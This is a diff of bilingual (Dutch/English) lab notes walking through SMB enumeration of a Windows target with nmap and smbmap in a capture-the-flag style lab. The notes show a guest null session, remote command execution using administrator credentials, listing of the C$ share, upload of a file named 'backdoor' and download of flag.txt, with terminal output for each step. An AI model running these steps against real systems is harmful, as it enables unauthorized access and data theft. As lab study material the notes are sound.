@@ -520,14 +520,14 @@ Based on this output, we can see that there are several services running on the 
    
 3. run an script voor smb protocols: *nmap -p445 --script smb-protocols {targetip}*  this will tell us the procols and dialects. When we spot dialect SMBv1 which is dangerous we will use smbmap
    
-4.  run smbmap voor smbv1: *smbmap -u guest -p " " -d . -H {target ip}* 
+4. Als je ziet dat versie 1 van smb gebruikt wordt dan gaan we een nullsession starten met volgende command: run smbmap voor smbv1: *smbmap -u guest -p "" -d . -H {target ip}* 
 	- -   `-u guest`: gebruikt de gebruikersnaam "guest" om verbinding te maken met de host.
-	-   `-p " "`: stelt het wachtwoord in op een lege string, wat betekent dat er geen wachtwoord wordt gebruikt om verbinding te maken met de host.
+	-   `-p ""`: stelt het wachtwoord in op een lege string, wat betekent dat er geen wachtwoord wordt gebruikt om verbinding te maken met de host.
 	-   `-d .`: stelt de domeinnaam in op "." (de huidige domeinnaam).
 	-   `-H {target ip}`: specificeert het IP-adres van de doel-SMB-host waarmee verbinding moet worden gemaakt.
 	- The results will be shares that the guest is able to connect to 
 	
-5. Try to run a command: *smbmap -H {taget ip} -u administrator -p smbserver_771 -x 'ipconfig' *
+5. Try to run a command: *smbmap -H {taget ip} -u administrator -p smbserver_771 -x 'ipconfig'*
 	- De optie `-x` wordt gebruikt om een opdracht uit te voeren op de SMB-host nadat er verbinding is gemaakt. In dit geval wordt de opdracht 'ipconfig' uitgevoerd, die de netwerkconfiguratie van de host weergeeft.
 	  
 6. run a command to see a list of drives and folders     : *smbmap -H {taget ip} -u administrator -p 'smbserver_771' -L *
@@ -549,9 +549,172 @@ Based on this output, we can see that there are several services running on the 
 		5. ls to see if download is complete 
 		6. read the file: *cat filename
 
+----------------- 
+
+LAB Windows recon: SMBMap 
+
+Your task is to fingerprint the service using the tools available on the Kali machine and run the smbmap tool to enumerate the target machine service.
+
+**Objective:** Enumerate the target machine SMB service using the smbmap tool and discover the flag.
+
+*Target IP:*: 10.2.17.126
+*My machine ip*: eth0: 10.1.0.12/16      -      eth1: 10.10.24.6/24
+
+
+Stappenplan SMBMap: 
+
+1.  Ping the target IP to check if it is alive. 
+	   Target is live ✔
+
+   
+   
+2.  Run an nmap scan: `nmap {target ip}`. ✔
+   
+		root@attackdefense:~# nmap 10.2.17.126
+		PORT      STATE SERVICE
+		135/tcp   open  msrpc
+		139/tcp   open  netbios-ssn
+		445/tcp   open  microsoft-ds  📍
+		3389/tcp  open  ms-wbt-server
+		49152/tcp open  unknown
+		49153/tcp open  unknown
+		49154/tcp open  unknown
+		49155/tcp open  unknown
+		49165/tcp open  unknown
+
+   
+   
+   
+3.  Run a script for SMB protocols: `nmap -p445 --script smb-protocols {target ip}`.
+   
+		root@attackdefense:~# nmap -p445 --script smb-protocols 10.2.17.126
+		PORT    STATE SERVICE
+		445/tcp open  microsoft-ds
+		Host script results:
+		| smb-protocols: 
+		|   dialects: 
+		|     NT LM 0.12 (SMBv1) [dangerous, but default]
+		|     2.02
+		|     2.10
+		|     3.00
+		|_    3.02
+
+   
+   
+4.  Run smbmap for SMBv1: `smbmap -u guest -p "" -d . -H {target ip}`.
+   
+		root@attackdefense:~# smbmap -u Guest -p "" -d . -H 10.2.17.126
+		[+] Guest session   	IP: 10.2.17.126:445	Name: 10.2.17.126                                       
+		Disk                                                  	Permissions	Comment
+			----                                                -----------	-------
+			ADMIN$                                            	NO ACCESS	Remote Admin
+			C                                                 	NO ACCESS	
+			C$                                                	NO ACCESS	Default share
+			D$                                                	NO ACCESS	Default share
+			Documents                                         	NO ACCESS	
+			Downloads                                         	NO ACCESS	
+			IPC$                                              	READ ONLY	Remote IPC
+			print$                                            	READ ONLY	Printer Drivers
+
+   
+   
+   
+5.  Try to run a command: `smbmap -H {target ip} -u administrator -p smbserver_771 -x 'ipconfig'`.
+   
+		root@attackdefense:~# smbmap -H 10.2.17.126 -u administrator -p smbserver_771 -x 'ipconfig'
+		Windows IP Configuration
+		Ethernet adapter Ethernet 2:
+		
+		   Connection-specific DNS Suffix  . : eu-central-1.compute.internal
+		   Link-local IPv6 Address . . . . . : fe80::b935:90b1:9bc5:2b43%12
+		   IPv4 Address. . . . . . . . . . . : 10.2.17.126
+		   Subnet Mask . . . . . . . . . . . : 255.255.240.0
+		   Default Gateway . . . . . . . . . : 10.2.16.1
+		
+		Tunnel adapter isatap.eu-central-1.compute.internal:
+		   Media State . . . . . . . . . . . : Media disconnected
+		   Connection-specific DNS Suffix  . : eu-central-1.compute.intern
+		   
+   
+   
+6.  Run a command to see a list of drives and folders: `smbmap -H {target ip} -u administrator -p 'smbserver_771' -L`.
+   
+		root@attackdefense:~# smbmap -H 10.2.17.126 -u administrator -p 'smbserver_771' -L
+		[+] Host 10.2.17.126 Local Drives: C:\ D:\ 📍
+		[+] Host 10.2.17.126 Net Drive(s):
+			No mapped network drives
+
+   
+   
+   
+   
+   
+7.  If there is a C$ share, try to connect with it using the following command: `smbmap -H {target ip} -u Administrator -p 'smbserver_771' -r 'C$'`.
+   
+		   root@attackdefense:~# smbmap -H 10.2.17.126 -u administrator -p 'smbserver_771' -r 'C$' 
+			IP: 10.2.17.126:445	Name: 10.2.17.126                                       
+		Disk                                                  	Permissions	Comment
+			----                                                 -----------	-------
+			C$                                                	READ, WRITE	
+			.\C$\*
+			dr--r--r--                0 Sat Sep  5 13:26:00 2020	$Recycle.Bin
+			fw--w--w--           398356 Wed Aug 12 10:47:41 2020	bootmgr
+			fr--r--r--                1 Wed Aug 12 10:47:40 2020	BOOTNXT
+			dr--r--r--                0 Wed Aug 12 10:47:41 2020	Documents and Settings
+			fr--r--r--               32 Mon Dec 21 21:27:10 2020	flag.txt 📍
+			fr--r--r--       8589934592 Mon May 15 16:49:40 2023	pagefile.sys
+			dr--r--r--                0 Wed Aug 12 10:49:32 2020	PerfLogs
+			dw--w--w--                0 Wed Aug 12 10:49:32 2020	Program Files
+			dr--r--r--                0 Sat Sep  5 14:35:45 2020	Program Files (x86)
+			dr--r--r--                0 Sat Sep  5 14:35:45 2020	ProgramData
+			dr--r--r--                0 Sat Sep  5 09:16:57 2020	System Volume Information
+			dw--w--w--                0 Sat Dec 19 11:14:55 2020	Users
+			dr--r--r--                0 Sat Dec 19 11:26:46 2020	Windows
+
+   
+   
+   
+   
+8.  Let's try the following:
+    -   Create a file called backdoor: `touch backdoor` and check with `ls` to see if the file exists.
+    -   Run the following command to upload the file: `smbmap -H {target ip} -u Administrator -p 'smbserver_771' --upload '/root/backdoor' 'C$\backdoor'`.
+    -   Check if the file was successfully uploaded: `smbmap -H {target ip} -u Administrator -p 'smbserver_771' -r 'C$'`.
+    -   Check if you can download a file: `smbmap -H {target ip} -u Administrator -p 'smbserver_771' --download 'C$\{filename.extension}'`.
+    -   Use `ls` to see if the download is complete.
+    -   Read the file: `cat filename`. 
+
+			
+			root@attackdefense:~# smbmap -H 10.2.17.126 -u administrator -p 'smbserver_771' -r 'C$' 
+			[+] IP: 10.2.17.126:445	Name: 10.2.17.126                                       
+			        Disk                                                  	Permissions	Comment
+				----                                                  	-----------	-------
+				C$                                                	READ, WRITE	
+				.\C$\*
+				dr--r--r--                0 Sat Sep  5 13:26:00 2020	$Recycle.Bin
+				fr--r--r--                0 Mon May 15 17:27:19 2023	backdoor
+				fw--w--w--           398356 Wed Aug 12 10:47:41 2020	bootmgr
+				fr--r--r--                1 Wed Aug 12 10:47:40 2020	BOOTNXT
+				dr--r--r--                0 Wed Aug 12 10:47:41 2020	Documents and Settings
+				fr--r--r--               32 Mon Dec 21 21:27:10 2020	flag.txt
+				fr--r--r--       8589934592 Mon May 15 16:49:40 2023	pagefile.sys
+				dr--r--r--                0 Wed Aug 12 10:49:32 2020	PerfLogs
+				dw--w--w--                0 Wed Aug 12 10:49:32 2020	Program Files
+				dr--r--r--                0 Sat Sep  5 14:35:45 2020	Program Files (x86)
+				dr--r--r--                0 Sat Sep  5 14:35:45 2020	ProgramData
+				dr--r--r--                0 Sat Sep  5 09:16:57 2020	System Volume Information
+				dw--w--w--                0 Sat Dec 19 11:14:55 2020	Users
+				dr--r--r--                0 Sat Dec 19 11:26:46 2020	Windows
+			root@attackdefense:~# smbmap -H 10.2.17.126 -u administrator -p 'smbserver_771' --download 'C$\flag.txt'
+			[+] Starting download: C$\flag.txt (32 bytes)
+			[+] File output to: /root/10.2.17.126-C_flag.txt
+			root@attackdefense:~# ls        
+			10.2.17.126-C_flag.txt	Desktop  backdoor  thinclient_drives
+			root@attackdefense:~# cat 10.2.17.126-C_flag.txt 
 
 
 
 
+####  SMB: Samba 1 
 
-cat 10.4.26.58-C_flag.txt 
+- run nmap on target 
+- run service scan on open port to determine what the services are (standard nmap makes a guess based on the port number but service scan gives definite anwer on the service)
